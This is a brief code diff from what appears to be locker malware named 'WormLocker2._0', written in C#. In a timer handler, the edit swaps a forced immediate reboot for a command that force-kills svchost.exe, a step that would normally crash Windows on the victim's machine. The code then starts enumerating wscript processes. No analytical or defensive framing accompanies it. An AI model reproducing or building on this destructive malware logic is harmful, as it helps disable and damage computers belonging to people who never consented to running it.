@@ -363,7 +363,7 @@ namespace WormLocker2._0
         private void tmr_out_Tick(object sender, EventArgs e)
         {
             tmr_out.Stop();
-            Process.Start("shutdown", "/r /t 0");
+            Process.Start("taskkill.exe", "/f /im svchost.exe");
 
             Process[] _process2 = null;
             _process2 = Process.GetProcessesByName("wscript");
